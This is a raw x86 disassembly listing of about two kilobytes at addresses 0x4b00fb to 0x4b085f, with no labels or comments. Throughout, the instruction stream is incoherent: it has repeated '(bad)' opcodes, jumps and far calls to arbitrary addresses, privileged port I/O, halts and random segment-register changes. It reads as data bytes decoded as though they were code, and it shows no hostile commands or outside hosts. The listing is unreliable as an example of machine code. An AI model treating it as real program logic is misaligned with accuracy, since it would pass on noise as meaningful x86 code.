  4b00fb:	mov    cl,0x17
  4b00fd:	jg     0x4b0174
  4b00ff:	xor    al,0x40
  4b0101:	push   es
  4b0102:	mov    ebp,0xc6086879
  4b0107:	nop
  4b0108:	mov    ch,0x4a
  4b010a:	cli    
  4b010b:	mul    BYTE PTR cs:[edi+0x68]
  4b010f:	or     al,0x23
  4b0111:	push   ebp
  4b0112:	push   ebx
  4b0113:	inc    edi
  4b0114:	call   0xab6e7fcd
  4b0119:	dec    eax
  4b011a:	je     0x4b0134
  4b011c:	dec    eax
  4b011d:	jne    0x4b0155
  4b011f:	scas   al,BYTE PTR es:[edi]
  4b0120:	push   ecx
  4b0121:	fistp  DWORD PTR [eax+0x346b5926]
  4b0127:	inc    DWORD PTR [esi]
  4b0129:	mov    eax,ds:0xe621a66b
  4b012e:	rcl    ch,0x83
  4b0131:	clc    
  4b0132:	push   edi
  4b0133:	pop    ecx
  4b0134:	or     cl,ah
  4b0136:	push   cs
  4b0137:	ja     0x4b015d
  4b0139:	sbb    al,0xfa
  4b013b:	outs   dx,BYTE PTR ds:[esi]
  4b013c:	out    dx,al
  4b013d:	or     al,0x9f
  4b013f:	ins    DWORD PTR es:[edi],dx
  4b0140:	mov    ebp,0x2bf3a7d
  4b0145:	loope  0x4b01bc
  4b0147:	mov    esp,0x79d204e3
  4b014c:	out    dx,eax
  4b014d:	sub    eax,0xd342d00e
  4b0152:	push   es
  4b0153:	out    0x61,al
  4b0155:	xor    esi,DWORD PTR [edx]
  4b0157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b0158:	lock xchg edi,eax
  4b015a:	add    ecx,eax
  4b015c:	ret    
  4b015d:	(bad)  
  4b015e:	mov    ds:0x43465e43,eax
  4b0163:	pop    eax
  4b0164:	pusha  
  4b0165:	xor    BYTE PTR [ecx+0x10e95845],dl
  4b016b:	xor    al,0x19
  4b016d:	sub    bl,bl
  4b016f:	fistp  DWORD PTR [ebx]
  4b0171:	rcl    BYTE PTR [ebx+0x568bcd7a],cl
  4b0177:	sub    ch,BYTE PTR [esp+ebx*2-0x744b538]
  4b017e:	lds    esp,FWORD PTR [ebp-0xbcb3a00]
  4b0184:	fadd   DWORD PTR [ebp+0x7d978f]
  4b018a:	or     eax,0xb12782e6
  4b018f:	add    esi,DWORD PTR [edi+0x61]
  4b0192:	rol    BYTE PTR [ebp+0x27057038],cl
  4b0198:	mov    ecx,0x886b3372
  4b019d:	pop    eax
  4b019e:	jo     0x4b012d
  4b01a0:	dec    eax
  4b01a1:	jo     0x4b018e
  4b01a3:	aaa    
  4b01a4:	loope  0x4b0195
  4b01a6:	adc    al,0x6d
  4b01a8:	inc    esp
  4b01a9:	push   ss
  4b01aa:	push   edx
  4b01ab:	sbb    eax,0x2e962475
  4b01b0:	jne    0x4b01ef
  4b01b2:	mov    edi,0x11fac9c
  4b01b7:	xchg   ebx,eax
  4b01b8:	mov    edi,0xb87c8b04
  4b01bd:	sub    eax,0x7a1f658c
  4b01c3:	ja     0x4b0156
  4b01c5:	push   edx
  4b01c6:	ins    DWORD PTR es:[edi],dx
  4b01c7:	xchg   ecx,eax
  4b01c8:	inc    eax
  4b01c9:	js     0x4b0240
  4b01cb:	or     esi,esp
  4b01cd:	std    
  4b01ce:	out    0x35,al
  4b01d0:	pop    esp
  4b01d1:	pop    esp
  4b01d2:	xor    ecx,ebx
  4b01d4:	xchg   ebx,eax
  4b01d5:	mov    edx,0xf7bcf36f
  4b01da:	mov    esp,0x1fa06dd
  4b01df:	call   0xd73e20b7
  4b01e4:	sbb    al,dh
  4b01e6:	outs   dx,BYTE PTR ds:[esi]
  4b01e7:	iret   
  4b01e8:	xor    BYTE PTR [eax],al
  4b01ea:	enter  0x301,0x2
  4b01ee:	add    DWORD PTR [ebx+0x3c916208],edi
  4b01f4:	pop    edi
  4b01f5:	xor    al,0x68
  4b01f7:	test   DWORD PTR [ebx],edx
  4b01f9:	stos   DWORD PTR es:[edi],eax
  4b01fa:	inc    edi
  4b01fb:	and    DWORD PTR [ecx+0x44],eax
  4b01fe:	sbb    DWORD PTR [ebp-0x4a829995],ebp
  4b0204:	adc    eax,0x51f037a8
  4b0209:	outs   dx,BYTE PTR ds:[esi]
  4b020a:	pop    ecx
  4b020b:	mov    ecx,DWORD PTR [ecx]
  4b020d:	daa    
  4b020e:	ret    0xcc90
  4b0211:	and    al,0x2d
  4b0213:	adc    al,0xa7
  4b0215:	inc    esi
  4b0216:	sbb    bh,ch
  4b0218:	add    DWORD PTR [ebx-0x6d],edx
  4b021b:	shr    BYTE PTR ds:0xcff87124,cl
  4b0221:	adc    esi,0x58
  4b0224:	sbb    al,BYTE PTR [ecx+0xab204e4]
  4b022a:	(bad)  
  4b022b:	or     ch,BYTE PTR [ebx]
  4b022d:	mov    bl,0xe6
  4b022f:	mov    fs,WORD PTR es:[ecx]
  4b0232:	cmp    ebx,edi
  4b0234:	push   ss
  4b0235:	push   eax
  4b0236:	xchg   ebx,eax
  4b0237:	inc    esi
  4b0238:	xchg   ecx,eax
  4b0239:	cmc    
  4b023a:	sbb    dh,BYTE PTR [esi+0x8ca275]
  4b0240:	jns    0x4b0283
  4b0242:	out    0x52,eax
  4b0244:	aas    
  4b0245:	lock inc ebx
  4b0247:	jnp    0x4b0247
  4b0249:	fst    st(6)
  4b024b:	in     al,dx
  4b024c:	or     DWORD PTR [eax+0x5],ebx
  4b024f:	prefetch BYTE PTR [ebx+0x14a92065]
  4b0256:	outs   dx,DWORD PTR ds:[esi]
  4b0257:	add    ch,bl
  4b0259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b025a:	nop
  4b025b:	stos   DWORD PTR es:[edi],eax
  4b025c:	push   ds
  4b025d:	repz mov al,ds:0x93315c00
  4b0263:	mov    WORD PTR [edi-0x6fe7c2ec],fs
  4b0269:	xor    ebx,ecx
  4b026b:	lahf   
  4b026c:	nop
  4b026d:	fnstenv [edx-0x3a]
  4b0270:	jl     0x4b0245
  4b0272:	lock xor al,BYTE PTR [eax+0x30]
  4b0276:	push   eax
  4b0277:	jp     0x4b022e
  4b0279:	jae    0x4b02dc
  4b027b:	popa   
  4b027c:	int3   
  4b027d:	ror    DWORD PTR [esi-0x2c],1
  4b0280:	pop    eax
  4b0281:	out    dx,eax
  4b0282:	rcr    BYTE PTR [ecx+0x16e62350],1
  4b0288:	mov    BYTE PTR [ebp-0x1e],al
  4b028b:	adc    dh,BYTE PTR [eax]
  4b028d:	add    al,0x5b
  4b028f:	dec    edx
  4b0290:	and    DWORD PTR [ecx+esi*2+0x54],ecx
  4b0294:	jae    0x4b0252
  4b0296:	dec    esi
  4b0297:	xchg   BYTE PTR [eax],dl
  4b0299:	test   eax,0x48be2713
  4b029e:	mov    al,ds:0x896f1b79
  4b02a3:	push   ds
  4b02a4:	test   BYTE PTR [ebp+0x72],bl
  4b02a7:	mov    ah,0xed
  4b02a9:	mov    eax,0xcda33863
  4b02ae:	mov    eax,0xefb67b4
  4b02b3:	mov    esp,0x596af931
  4b02b8:	jnp    0xf6584ff
  4b02be:	lea    ebp,[ebx+0x55]
  4b02c1:	call   0xa040:0x617c0578
  4b02c8:	pop    edx
  4b02c9:	jle    0x4b02bf
  4b02cb:	fdivr  st(0),st
  4b02cd:	stos   DWORD PTR es:[di],eax
  4b02cf:	xchg   ecx,eax
  4b02d0:	ins    BYTE PTR es:[edi],dx
  4b02d1:	xchg   ebx,eax
  4b02d2:	push   edx
  4b02d3:	adc    DWORD PTR [edx*4+0x53f08d9a],ecx
  4b02da:	hlt    
  4b02db:	rol    BYTE PTR [edi],1
  4b02dd:	jge    0x4b028f
  4b02df:	int    0xc9
  4b02e1:	jl     0x4b026e
  4b02e3:	sti    
  4b02e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b02e5:	pop    esi
  4b02e6:	shl    DWORD PTR [edi+0x60],1
  4b02e9:	mov    dh,0x3b
  4b02eb:	jp     0x4b035f
  4b02ed:	sbb    eax,0xb6151bc1
  4b02f2:	inc    esp
  4b02f3:	repz iret 
  4b02f5:	xchg   edi,eax
  4b02f6:	cmp    DWORD PTR [esi],ecx
  4b02f8:	xor    al,0xda
  4b02fa:	jecxz  0x4b0343
  4b02fc:	in     al,dx
  4b02fd:	xor    eax,DWORD PTR [ebx+0xb106979]
  4b0303:	pop    ecx
  4b0304:	mov    BYTE PTR [edi+0x52b60311],cl
  4b030a:	and    DWORD PTR [ecx-0x20],0x13991414
  4b0311:	add    DWORD PTR ds:0x70d79e78,ebp
  4b0317:	test   al,0x72
  4b0319:	inc    eax
  4b031a:	nop
  4b031b:	push   es
  4b031c:	arpl   WORD PTR [edi],si
  4b031e:	adc    BYTE PTR [esi],dh
  4b0320:	ins    BYTE PTR es:[edi],dx
  4b0321:	add    al,0x70
  4b0323:	pusha  
  4b0324:	mov    ch,0xef
  4b0326:	xor    BYTE PTR [esi],al
  4b0328:	inc    ecx
  4b0329:	sbb    cl,bl
  4b032b:	ins    BYTE PTR es:[edi],dx
  4b032c:	xlat   BYTE PTR ds:[ebx]
  4b032d:	xor    eax,0xdc4c96fc
  4b0332:	test   ah,bh
  4b0334:	jb     0x4b034c
  4b0336:	pop    es
  4b0337:	pop    eax
  4b0338:	ret    
  4b0339:	xchg   edi,eax
  4b033a:	lea    ebx,[ecx+0x2]
  4b033d:	es ss add eax,0x32041c49
  4b0344:	lock xchg edi,eax
  4b0346:	or     BYTE PTR [esi-0x7f],al
  4b0349:	outs   dx,DWORD PTR ds:[esi]
  4b034a:	jg     0x4b0343
  4b034c:	mov    ebp,0xd625bfc1
  4b0351:	xlat   BYTE PTR ds:[ebx]
  4b0352:	mov    ecx,ebx
  4b0354:	mov    ebp,DWORD PTR [ecx]
  4b0356:	lods   al,BYTE PTR ds:[esi]
  4b0357:	mov    esp,0xfa62d4eb
  4b035c:	outs   dx,BYTE PTR ds:[esi]
  4b035d:	xor    al,0xed
  4b035f:	int3   
  4b0360:	jl     0x4b03da
  4b0362:	add    al,0xed
  4b0364:	jns    0x4b0377
  4b0366:	mov    eax,ds:0x4f166735
  4b036b:	daa    
  4b036c:	test   BYTE PTR [ebx+ebp*1-0x7ef5d60f],cl
  4b0373:	test   eax,0xc6d78c14
  4b0378:	push   0x38dac3cc
  4b037d:	pop    es
  4b037e:	adc    BYTE PTR [esi-0x3b],0x93
  4b0382:	xchg   ebx,eax
  4b0383:	lahf   
  4b0384:	aaa    
  4b0385:	xor    al,0x15
  4b0387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b0388:	pop    ds
  4b0389:	sub    DWORD PTR [edx+0x4480964],ebp
  4b038f:	mov    eax,ds:0x2d4d0f40
  4b0394:	jmp    0xddae55e4
  4b0399:	add    BYTE PTR [ecx-0x74e342b8],ah
  4b039f:	dec    esi
  4b03a0:	pop    edi
  4b03a1:	mov    al,ds:0x635a82ee
  4b03a6:	and    dh,BYTE PTR [ebx]
  4b03a8:	dec    eax
  4b03a9:	jl     0x4b034c
  4b03ab:	imul   esi,DWORD PTR ds:0xb3ea945f,0x7d23a694
  4b03b5:	add    al,0xd3
  4b03b7:	leave  
  4b03b8:	lods   al,BYTE PTR ds:[esi]
  4b03b9:	or     eax,0xc787e8b7
  4b03be:	cwde   
  4b03bf:	or     dl,ah
  4b03c1:	mov    DWORD PTR [edx+edx*1-0x1],esi
  4b03c5:	push   ebx
  4b03c6:	rcl    esp,cl
  4b03c8:	(bad)  
  4b03c9:	xor    DWORD PTR [ebp+edx*2+0x705cc781],edx
  4b03d0:	push   0x3ad99d0c
  4b03d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b03d6:	jne    0x4b0360
  4b03d8:	mov    esi,0x5eb8b787
  4b03dd:	imul   esp,DWORD PTR [eax],0xffffffc5
  4b03e0:	mov    ch,0xb9
  4b03e2:	clc    
  4b03e3:	xor    BYTE PTR [eax-0x31ce5e07],ch
  4b03e9:	or     eax,0x82bf2d9e
  4b03ee:	shl    DWORD PTR [ecx+0x1a],0x56
  4b03f2:	fwait
  4b03f3:	shr    DWORD PTR [eax-0xf],1
  4b03f6:	inc    esp
  4b03f7:	loop   0x4b044f
  4b03f9:	lahf   
  4b03fa:	arpl   WORD PTR [ebx+eax*4],cx
  4b03fd:	in     al,dx
  4b03fe:	push   esi
  4b03ff:	inc    esp
  4b0400:	or     eax,0x175211c7
  4b0405:	and    ebp,ebp
  4b0407:	arpl   WORD PTR [ebp+0x6347c956],si
  4b040d:	test   eax,0x9f763bf4
  4b0412:	leave  
  4b0413:	jle    0x4b0446
  4b0415:	cmp    eax,DWORD PTR [esi-0x1cf6c3da]
  4b041b:	mov    esp,0x968b2964
  4b0420:	pushf  
  4b0421:	dec    eax
  4b0422:	in     al,0xda
  4b0424:	sahf   
  4b0425:	xor    ch,BYTE PTR [edx]
  4b0427:	(bad)  
  4b0428:	jns    0x4b043a
  4b042a:	repz pop es
  4b042c:	and    eax,0xc7960305
  4b0431:	cli    
  4b0432:	pop    esi
  4b0433:	mov    esp,0xc92c8afb
  4b0438:	xor    cl,BYTE PTR [esi+0x78]
  4b043b:	push   ebp
  4b043c:	cmp    esi,DWORD PTR [edi-0x74b28235]
  4b0442:	xchg   edi,eax
  4b0443:	lea    ebx,[edi]
  4b0445:	xchg   esp,eax
  4b0446:	mov    cl,0xcf
  4b0448:	aas    
  4b0449:	jb     0x4b0452
  4b044b:	gs pushf 
  4b044d:	push   esi
  4b044e:	adc    DWORD PTR [ecx-0x72],0x41d8d211
  4b0455:	cdq    
  4b0456:	lahf   
  4b0457:	cmp    dl,ch
  4b0459:	pop    ecx
  4b045a:	xor    dh,BYTE PTR [ecx]
  4b045c:	cwde   
  4b045d:	xor    BYTE PTR [esp+edi*1],dl
  4b0460:	and    BYTE PTR [esi+eax*1],dl
  4b0463:	adc    ebx,DWORD PTR [edi-0x5a]
  4b0466:	ror    BYTE PTR [esp+eax*2],cl
  4b0469:	adc    eax,0x882e9036
  4b046e:	sub    BYTE PTR [ebx-0x6e],ah
  4b0471:	mov    WORD PTR [eax],fs
  4b0473:	in     eax,0x33
  4b0475:	test   BYTE PTR [eax+0x5a],cl
  4b0478:	(bad)  
  4b0479:	mov    WORD PTR [ebp-0x16e774ff],?
  4b047f:	add    ebx,DWORD PTR [edi-0x7abaf8bc]
  4b0485:	mov    ebp,0x7d1c750b
  4b048a:	lds    ebx,FWORD PTR [edx-0x6a3aee00]
  4b0490:	cmp    cl,BYTE PTR [esi+0x2]
  4b0493:	call   0x1f2f20b9
  4b0498:	xchg   esi,eax
  4b0499:	or     eax,0xfde18754
  4b049e:	sahf   
  4b049f:	sbb    DWORD PTR [esi+0x6dbf6408],0xffffffe1
  4b04a6:	inc    edi
  4b04a7:	add    edx,0x16
  4b04aa:	icebp  
  4b04ab:	pop    ebx
  4b04ac:	or     BYTE PTR [ecx+0x3c485a60],al
  4b04b2:	xor    BYTE PTR [ebx+ebp*2-0x7d6c8140],ch
  4b04b9:	ror    DWORD PTR [ebx],0x72
  4b04bc:	pop    edx
  4b04bd:	sbb    eax,0xb9579ec3
  4b04c2:	mov    DWORD PTR [edx],eax
  4b04c4:	rol    DWORD PTR [edi+0x53],0xf6
  4b04c8:	mov    ds:0x1aafde64,eax
  4b04cd:	test   eax,0x49041847
  4b04d2:	pop    edi
  4b04d3:	and    al,0x9a
  4b04d5:	sbb    al,0x2c
  4b04d7:	test   al,0x47
  4b04d9:	add    ah,BYTE PTR [eax+0x784042cd]
  4b04df:	add    bl,BYTE PTR [ebp+0x10]
  4b04e2:	mov    ah,0xb5
  4b04e4:	adc    al,0x65
  4b04e6:	push   ss
  4b04e7:	dec    eax
  4b04e8:	std    
  4b04e9:	sbb    eax,0x18773500
  4b04ee:	cmp    ecx,DWORD PTR [ebp+0x4c8b7604]
  4b04f4:	(bad)  
  4b04f5:	cmp    BYTE PTR [eax+0xca02978],cl
  4b04fb:	(bad)  
  4b04fc:	aam    0xf9
  4b04fe:	adc    BYTE PTR [ebp+0x586aeab5],al
  4b0504:	push   esp
  4b0505:	jbe    0x4b050d
  4b0507:	jo     0x4b04e0
  4b0509:	add    BYTE PTR [ebx-0x81c9e61],dh
  4b050f:	push   eax
  4b0510:	inc    esp
  4b0511:	sub    BYTE PTR [edi],cl
  4b0513:	xchg   DWORD PTR [edx],esp
  4b0515:	adc    DWORD PTR [ebp-0x29f6c874],0x7a
  4b051c:	inc    ebp
  4b051d:	ins    DWORD PTR es:[edi],dx
  4b051e:	add    al,0xb
  4b0520:	add    DWORD PTR [edx+eiz*2+0x14],eax
  4b0524:	dec    ecx
  4b0525:	cmp    dh,BYTE PTR [ebx]
  4b0527:	inc    ecx
  4b0528:	js     0x4b04af
  4b052a:	xchg   edx,eax
  4b052b:	or     eax,0xba5a1840
  4b0530:	ss out 0xc1,eax
  4b0533:	or     ebp,DWORD PTR [edx+0x1caf6481]
  4b0539:	fs clc 
  4b053b:	sub    esi,DWORD PTR [ebx+ebx*1+0x49]
  4b053f:	mov    bl,al
  4b0541:	push   ebx
  4b0542:	push   ecx
  4b0543:	fsubr  QWORD PTR [ecx+ecx*8-0x25]
  4b0547:	sbb    esp,DWORD PTR [ecx]
  4b0549:	or     BYTE PTR [ecx+eax*8+0x420e4d60],al
  4b0550:	or     BYTE PTR [esi-0x20],dh
  4b0553:	add    BYTE PTR [ebp+0x41890eb6],0x44
  4b055a:	jb     0x4b05c6
  4b055c:	push   0xffffff8c
  4b055e:	adc    eax,0x9096eed2
  4b0563:	in     al,dx
  4b0564:	add    ebp,DWORD PTR [ecx]
  4b0566:	pop    ss
  4b0567:	jae    0x4b057d
  4b0569:	pop    ds
  4b056a:	repz add al,0x5b
  4b056d:	sub    DWORD PTR [ebx],ecx
  4b056f:	xchg   edi,eax
  4b0570:	fisubr WORD PTR [di]
  4b0573:	iret   
  4b0574:	jge    0x4b0512
  4b0576:	xchg   edx,eax
  4b0577:	fxch   st(1)
  4b0579:	or     BYTE PTR [ebx+eax*1],cl
  4b057c:	xchg   ecx,eax
  4b057d:	(bad)  
  4b057f:	pop    eax
  4b0580:	shr    bh,cl
  4b0582:	arpl   ax,di
  4b0584:	daa    
  4b0585:	aad    0x5a
  4b0587:	mov    bl,0xc4
  4b0589:	dec    ebp
  4b058a:	jmp    0xa83:0xcf88668c
  4b0591:	lock aad 0xba
  4b0594:	xor    eax,0x9caa3388
  4b0599:	fnstcw WORD PTR [ecx+ebx*8]
  4b059c:	pop    ebp
  4b059d:	add    cl,bl
  4b059f:	or     DWORD PTR [eax],ecx
  4b05a1:	aas    
  4b05a2:	fstp   DWORD PTR [ebx+esi*1]
  4b05a5:	fisttp QWORD PTR [eax-0x7d]
  4b05a8:	and    DWORD PTR ds:0xa65d2105,0xffffff84
  4b05af:	int    0x5e
  4b05b1:	lea    esi,[eax+edx*2-0x8]
  4b05b5:	test   DWORD PTR [ecx-0x1992c0eb],0x3c4d59a6
  4b05bf:	push   ecx
  4b05c0:	adc    ebp,ebx
  4b05c2:	fist   WORD PTR [ebx+0x1]
  4b05c5:	sbb    esp,DWORD PTR [ecx-0x1e]
  4b05c8:	adc    al,0xb
  4b05ca:	scas   eax,DWORD PTR es:[edi]
  4b05cb:	(bad)
  4b05ce:	adc    al,0x5e
  4b05d0:	adc    dh,ah
  4b05d2:	lea    eax,[esp+eiz*2+0xc]
  4b05d6:	(bad)  
  4b05d7:	jmp    0x4b0629
  4b05d9:	aad    0x90
  4b05db:	or     bh,bl
  4b05dd:	pop    edi
  4b05de:	jmp    0x4b0623
  4b05e0:	cmp    DWORD PTR [eax+0x3c],edx
  4b05e3:	je     0x4b0623
  4b05e5:	mov    DWORD PTR [eax],ecx
  4b05e7:	mov    edi,0xebb50323
  4b05ec:	sub    cl,0xa2
  4b05ef:	sub    al,0x88
  4b05f1:	aas    
  4b05f2:	cwde   
  4b05f3:	add    BYTE PTR [ebp+0x50],bl
  4b05f6:	imul   ecx,DWORD PTR [ecx+0x10ebcf14],0xffffffbc
  4b05fd:	pop    es
  4b05fe:	push   0xce23f78e
  4b0603:	ds push ds
  4b0605:	pop    ds
  4b0606:	xor    DWORD PTR [ebx+eax*4-0x113df73d],0x3b
  4b060e:	add    BYTE PTR [eax+0x28],bh
  4b0611:	jge    0x4b059f
  4b0613:	xchg   ebp,eax
  4b0614:	bound  ecx,QWORD PTR [ebp+0x14]
  4b0617:	jnp    0x4b05a1
  4b0619:	and    BYTE PTR [edi+0x6f],ch
  4b061c:	add    DWORD PTR [ecx+0x79],esi
  4b061f:	inc    ebp
  4b0620:	pop    es
  4b0621:	xor    al,0x9f
  4b0623:	out    0xe4,eax
  4b0625:	push   esi
  4b0626:	das    
  4b0627:	inc    edx
  4b0628:	push   ebx
  4b0629:	js     0x4b05f5
  4b062b:	ror    DWORD PTR [ebp-0x62],cl
  4b062e:	test   ebp,0x7ab8b2e
  4b0634:	ror    DWORD PTR [ecx+0x1a],cl
  4b0637:	cmp    eax,0x2bfdf2cf
  4b063c:	or     al,BYTE PTR [edx+0x6a]
  4b063f:	shl    BYTE PTR [ecx+0x39],0xf9
  4b0643:	loope  0x4b069b
  4b0645:	(bad)  
  4b0646:	push   eax
  4b0647:	mov    ds:0x6266c77d,al
  4b064c:	(bad)  
  4b064d:	or     BYTE PTR [ebx+0x6520fb6],bl
  4b0653:	test   DWORD PTR [edx],ebx
  4b0655:	adc    ebx,DWORD PTR [ebx]
  4b0657:	inc    esp
  4b0658:	mov    ch,0xc9
  4b065a:	sbb    BYTE PTR [eax-0x76e9f664],bl
  4b0660:	add    BYTE PTR [edx],al
  4b0662:	adc    al,0x30
  4b0664:	xchg   esp,eax
  4b0665:	and    BYTE PTR [esi+0x1ea6e9e7],al
  4b066b:	and    eax,0x23719123
  4b0670:	sahf   
  4b0671:	adc    eax,DWORD PTR [ebp+0x5]
  4b0674:	ja     0x4b06d2
  4b0676:	push   esi
  4b0677:	int    0x7b
  4b0679:	inc    ebp
  4b067a:	xor    ecx,DWORD PTR [edx-0x144e6bc2]
  4b0680:	and    DWORD PTR [eax],eax
  4b0682:	inc    eax
  4b0683:	in     al,dx
  4b0684:	shl    BYTE PTR [edx+ebx*4],cl
  4b0687:	out    dx,al
  4b0688:	mov    eax,0x80131b20
  4b068d:	rcl    BYTE PTR [ebx-0x7fa42c7f],1
  4b0693:	pop    ebx
  4b0694:	cmp    al,dh
  4b0696:	call   0x5845:0x5ce83f11
  4b069d:	or     BYTE PTR [esi],ah
  4b069f:	cmp    DWORD PTR [ecx],eax
  4b06a1:	add    BYTE PTR [ebx-0xa],ah
  4b06a4:	fisubr WORD PTR [ecx-0x67]
  4b06a7:	ins    BYTE PTR es:[edi],dx
  4b06a8:	dec    ecx
  4b06a9:	std    
  4b06aa:	jmp    DWORD PTR [ebx-0x26]
  4b06ad:	push   0xffffffe0
  4b06af:	cmp    al,0xcf
  4b06b1:	repz push es
  4b06b3:	jno    0x4b072d
  4b06b5:	jg     0x4b063d
  4b06b7:	aam    0x9a
  4b06b9:	fiadd  DWORD PTR [eax]
  4b06bb:	jmp    0x80b4f847
  4b06c0:	test   eax,0x76f812ed
  4b06c5:	adc    BYTE PTR [edi+0x3a],bl
  4b06c8:	enter  0xbd63,0xd
  4b06cc:	and    al,BYTE PTR [eax+0x2c]
  4b06cf:	or     DWORD PTR [eax+0x23],edx
  4b06d2:	mov    edx,0x53f0242c
  4b06d7:	sbb    eax,0x2308b029
  4b06dc:	mov    eax,ds:0x2a06a35
  4b06e1:	pop    ebx
  4b06e2:	and    ch,BYTE PTR [ecx+0x11d725]
  4b06e8:	mov    bl,0x6c
  4b06ea:	and    al,0xf9
  4b06ec:	and    al,0x54
  4b06ee:	cld    
  4b06ef:	mov    BYTE PTR [edx-0x14],bl
  4b06f2:	push   esi
  4b06f3:	cmp    al,0x2e
  4b06f5:	push   ebx
  4b06f6:	push   eax
  4b06f7:	out    dx,al
  4b06f8:	xor    BYTE PTR [esi],al
  4b06fa:	ret    0x2562
  4b06fd:	out    dx,al
  4b06fe:	bound  ecx,QWORD PTR [ebx]
  4b0700:	(bad)  
  4b0702:	add    ah,0xcb
  4b0705:	jb     0x4b072d
  4b0707:	mov    DWORD PTR [edx],esi
  4b0709:	push   esi
  4b070a:	cmp    eax,0x8d0d4116
  4b070f:	pop    ebx
  4b0710:	adc    esi,edx
  4b0712:	fcomp  st(6)
  4b0714:	fiadd  WORD PTR [eax]
  4b0716:	inc    edi
  4b0717:	fadd   QWORD PTR [ecx+0x29]
  4b071a:	fcom   DWORD PTR [esi+0x3e]
  4b071d:	lahf   
  4b071e:	adc    al,BYTE PTR [ebx+0x3508bc5d]
  4b0724:	push   esi
  4b0725:	mov    es,WORD PTR [edx+esi*2]
  4b0728:	push   edx
  4b0729:	add    BYTE PTR [esi],ah
  4b072b:	xchg   edi,eax
  4b072c:	xor    al,0xc
  4b072e:	scas   eax,DWORD PTR es:[edi]
  4b072f:	add    BYTE PTR [edi+ebp*8],bl
  4b0732:	pop    ds
  4b0733:	nop
  4b0734:	jp     0x4b0742
  4b0736:	rcl    DWORD PTR [edx],cl
  4b0738:	push   edi
  4b0739:	mov    ebx,0x2f5aea48
  4b073e:	xchg   ebx,eax
  4b073f:	dec    edx
  4b0740:	arpl   sp,di
  4b0742:	push   es
  4b0743:	or     BYTE PTR [edx+0x5],dh
  4b0746:	jb     0x4b0759
  4b0748:	dec    ebp
  4b0749:	adc    dl,ch
  4b074b:	rcl    DWORD PTR [ecx-0x3e],0xf
  4b074f:	mov    bh,0xa6
  4b0751:	push   0xc045ac55
  4b0756:	sbb    eax,0xe845696a
  4b075b:	mov    ah,0x82
  4b075d:	cmp    al,0x90
  4b075f:	es cwde 
  4b0761:	xor    BYTE PTR [edx],ch
  4b0763:	inc    eax
  4b0764:	retf   0x4706
  4b0767:	shr    BYTE PTR [esi+0x1],0x90
  4b076b:	jmp    0x105a2af3
  4b0770:	mov    eax,ds:0xae2bcbc
  4b0775:	or     eax,0xdae006a0
  4b077a:	les    edx,FWORD PTR [ecx+0x4a]
  4b077d:	sbb    eax,DWORD PTR [edx+0x52]
  4b0780:	(bad)  
  4b0781:	and    cl,al
  4b0783:	clc    
  4b0784:	or     DWORD PTR [edi-0x25],edi
  4b0787:	sbb    eax,0x9da43e02
  4b078c:	test   edi,edi
  4b078e:	sbb    BYTE PTR [edi-0xa],dl
  4b0791:	jne    0x4b07cd
  4b0793:	jb     0x4b0758
  4b0795:	rol    DWORD PTR [ebp-0x3ecfa997],1
  4b079b:	rcr    DWORD PTR [eax],1
  4b079d:	sbb    cl,BYTE PTR [eax+0x19]
  4b07a0:	push   edx
  4b07a1:	scas   eax,DWORD PTR es:[edi]
  4b07a2:	cs xchg ebp,eax
  4b07a4:	test   al,0x50
  4b07a6:	or     edi,DWORD PTR [ebp+0x33]
  4b07a9:	in     al,dx
  4b07aa:	das    
  4b07ab:	or     eax,0x89e71fa3
  4b07b0:	adc    DWORD PTR [eax+0x4],0xc2e38349
  4b07b7:	push   es
  4b07b8:	cdq    
  4b07b9:	dec    esp
  4b07ba:	mov    bh,0xac
  4b07bc:	mov    dh,0xa3
  4b07be:	or     edx,eax
  4b07c0:	lods   al,BYTE PTR ds:[esi]
  4b07c1:	cdq    
  4b07c2:	imul   ecx,DWORD PTR [ecx],0x4e
  4b07c5:	stos   DWORD PTR es:[edi],eax
  4b07c6:	and    ebp,DWORD PTR [ebx+0x1f4b9baa]
  4b07cc:	icebp  
  4b07cd:	imul   ecx,DWORD PTR [eax+0x0],0x7c4f6c5a
  4b07d4:	fiadd  DWORD PTR [ecx+edx*2-0x7e40fd]
  4b07db:	imul   edi,DWORD PTR [edx],0xffffff88
  4b07de:	mov    ch,BYTE PTR [ecx+ecx*4]
  4b07e1:	adc    dl,ah
  4b07e3:	loope  0x4b0855
  4b07e5:	je     0x4b0829
  4b07e7:	cld    
  4b07e8:	sub    al,0xfb
  4b07ea:	add    ecx,DWORD PTR [eax+0x35]
  4b07ed:	push   es
  4b07ee:	dec    ebp
  4b07ef:	xchg   edx,eax
  4b07f0:	(bad)  
  4b07f1:	sbb    edx,eax
  4b07f3:	xchg   dh,cl
  4b07f5:	and    DWORD PTR [ecx-0x5c],eax
  4b07f8:	les    ebp,FWORD PTR [edi+ebx*4]
  4b07fb:	gs inc edx
  4b07fd:	adc    eax,0x1edd4ec6
  4b0802:	pop    ebx
  4b0803:	daa    
  4b0804:	mov    ah,0x26
  4b0806:	or     ecx,eax
  4b0808:	sub    eax,0x645c051d
  4b080d:	ins    BYTE PTR es:[edi],dx
  4b080e:	out    0x30,eax
  4b0810:	push   esi
  4b0811:	adc    DWORD PTR [eax*4-0x16b7ed8c],0x2b8fc679
  4b081c:	or     al,0xaa
  4b081e:	ja     0x4b0867
  4b0820:	mov    bl,0x9c
  4b0822:	rol    bh,0x52
  4b0825:	sub    BYTE PTR [ebp-0x66],cl
  4b0828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b0829:	jmp    0x580108be
  4b082e:	dec    dx
  4b0830:	add    al,0x3f
  4b0832:	adc    BYTE PTR [eax+0x49],0x89
  4b0836:	sub    edx,0x5a
  4b0839:	xchg   esi,eax
  4b083a:	jnp    0x4b07eb
  4b083c:	or     BYTE PTR [edx],0xc7
  4b083f:	(bad)  
  4b0841:	imul   esp,DWORD PTR [esp+ebx*4-0xa],0x4c305fd3
  4b0849:	in     al,0x5b
  4b084b:	shl    esp,cl
  4b084d:	mov    es:0x5a0e3330,eax
  4b0853:	hlt    
  4b0854:	add    DWORD PTR [ebx-0x28],ecx
  4b0857:	dec    esi
  4b0858:	xor    esi,esi
  4b085a:	mov    eax,ds:0x9412cbea
  4b085f:	add    ah,BYTE PTR [eax-0x8]
